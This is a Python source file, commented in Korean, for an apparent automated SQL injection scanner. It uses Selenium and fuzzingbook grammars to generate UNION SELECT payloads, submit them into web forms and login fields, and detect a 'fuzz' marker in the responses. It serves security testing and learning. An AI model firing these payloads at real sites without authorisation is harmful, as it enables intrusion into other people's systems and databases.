from fuzzingbook.WebFuzzer import *
from selenium.common import NoSuchElementException, NoAlertPresentException
from selenium.webdriver.common.by import By


def check_attackable(driver, url) -> bool:
    # WebDriver 초기화
    driver.get(url)

    # 모든 input 요소와 select 요소 검색
    input_elements_text = driver.find_elements(By.CSS_SELECTOR, "input[type='text']")
    input_elements_password = driver.find_elements(By.CSS_SELECTOR, "input[type='password']")
    textarea_elements = driver.find_elements(By.TAG_NAME, "textarea")
    select_elements = driver.find_elements(By.TAG_NAME, "select")

    # 화면에 표시된 input 요소 또는 select 요소가 있는지 확인
    for element in input_elements_text + input_elements_password + select_elements + textarea_elements:
        if element.is_displayed():
            return True

    return False


def submit_form(driver, form_details, url, value) -> dict:
    # command injection payload 전송 함수

    result = {"Vulnerability": "", "URL": "", "Method": "", "Payload": ""}  # 결과를 저장할 변수

    target_url = urljoin(url, form_details["action"])
    base_url = ""
    joined_url = ""
    inputs = form_details["inputs"]

    if "session" in target_url.split("/")[-1]:
        base_url = target_url.replace(target_url.split("/")[-1], '')

    # 공격 인자값 가져오기
    data = {}
    for input in inputs:
        if input["type"] == "text" or input["type"] == "search" or input["type"] == "id" or input["type"] == "password":
            input["value"] = value

        if input["type"] == "submit":
            input["value"] = "Submit"

        input_name = input.get("name")
        input_value = input.get("value")

        if input_name and input_value:
            data[input_name] = input_value

    if form_details["method"] == "get":  # GET 방식으로 전송할 때
        joined_url = target_url + "?" + urllib.parse.urlencode(data)
        driver.get(joined_url)
        page_source = driver.page_source

        if ("fuzz" in page_source) or ("66757A7A" in page_source):
            print(page_source)
            result["Vulnerability"] = "SQL Injection"
            result["URL"] = url
            result["Method"] = form_details["method"]
            result["Payload"] = data

            driver.get(target_url)
    elif form_details["method"] == "post":  # POST 방식으로 전송할 때
        keys = list(data.keys())[:2]
        username = keys[0]
        password = keys[1]

        try:
            elem = driver.find_element(By.NAME, username)
            elem2 = driver.find_element(By.NAME, password)

            if elem.is_displayed():
                elem.send_keys(value)
                elem2.send_keys('aaa')
            else:
                return result
        except NoSuchElementException:
            print(driver.page_source)

        try:  # submit 버튼을 찾아서 클릭
            submit_button = driver.find_element(By.CSS_SELECTOR, 'input[type="submit"]')
            submit_button.click()
        except NoSuchElementException:
            try:  # submit 버튼을 찾아서 클릭
                submit_button = driver.find_element(By.CSS_SELECTOR, 'button[type="button"]')
            except NoSuchElementException:
                print("해당 요소를 찾을 수 없습니다.")

        try:
            # 알림 창 무시하고 진행
            alert = driver.switch_to.alert
            alert.dismiss()
        except NoAlertPresentException:
            # 알림 창이 이미 사라진 경우
            pass

        if base_url != "":
            driver.get(base_url)
            page_source = driver.page_source

            if ("fuzz" in page_source) or ("66757A7A" in page_source):
                result["Vulnerability"] = "SQL Injection"
                result["URL"] = url
                result["Method"] = form_details["method"]
                result["Payload"] = data

            driver.get(target_url)

    return result


def generate_payload(count: int) -> list[str]:
    SQL_Injection_Grammar: Grammar = {
        '<start>': ['<sql>'],
        '<sql>': ['<special-symbol> <union><annotation>'],
        '<special-symbol>': ['', '1"', "1'", "'", '"', '1)', '")', "')", '1))', '"))', "'))"],
        '<union>': ['union select "fu" "" "zz"', 'union select hex("fu" "" "zz")'],
        '<annotation>': ['#', '-- xx', '%23', ';%00']
    }

    SQL_Injection_Grammar2: Grammar = {
        '<start>': ['<sql>'],
        '<sql>': ['<special-symbol> <union><annotation>'],
        '<special-symbol>': ['', '1"', "1'", "'", '"', '1)', '")', "')", '1))', '"))', "'))"],
        '<union>': ['union select 1, "fu" "" "zz"', 'union select 1, hex("fu" "" "zz")'],
        '<annotation>': ['#', '-- xx', '%23', ';%00']
    }

    payloads: list[str] = []

    sql_injection_fuzzer = GrammarFuzzer(SQL_Injection_Grammar, max_nonterminals=11)
    sql_injection_fuzzer2 = GrammarFuzzer(SQL_Injection_Grammar2, max_nonterminals=11)
    payloads = set()

    while len(payloads) < (count // 2):
        payload = sql_injection_fuzzer.fuzz()
        payloads.add(payload)

    while len(payloads) < count:
        payload = sql_injection_fuzzer2.fuzz()
        payloads.add(payload)

    payloads = list(payloads)

    return payloads

